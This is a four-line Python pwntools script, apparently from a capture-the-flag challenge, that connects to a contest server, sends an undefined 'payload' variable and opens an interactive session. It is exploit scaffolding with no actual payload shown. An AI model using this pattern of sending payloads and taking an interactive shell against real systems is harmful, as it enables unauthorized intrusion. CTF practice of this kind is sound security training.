from pwn import *
r = remote("shell.actf.co", 21303)
r.send(payload)
r.interactive()
